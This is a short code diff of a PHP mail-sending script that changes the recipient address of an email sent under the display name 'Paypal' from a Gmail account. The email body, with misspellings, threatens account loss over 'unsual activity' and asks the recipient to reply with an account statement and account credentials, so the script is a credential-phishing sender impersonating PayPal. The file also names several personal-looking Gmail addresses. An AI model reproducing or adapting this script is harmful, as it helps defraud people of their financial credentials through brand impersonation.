@@ -17,7 +17,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $mail->Port = 587;
 
         $mail->setFrom('payp42555@gmail.com', 'Paypal');
-        $mail->addAddress('queende7728@gmail.com', 'Victoria');
+        $mail->addAddress('chappiedice@gmail.com', 'Ugo');
         $mail->Subject = 'Protect your Information';
         $mail->Body = 'You will loose your account if you don/t follow protocols We suspected an unsual activity in your account to prevent your account from being blocked reply back with your Account statement and account credentials Your account is secured with us! ';
 
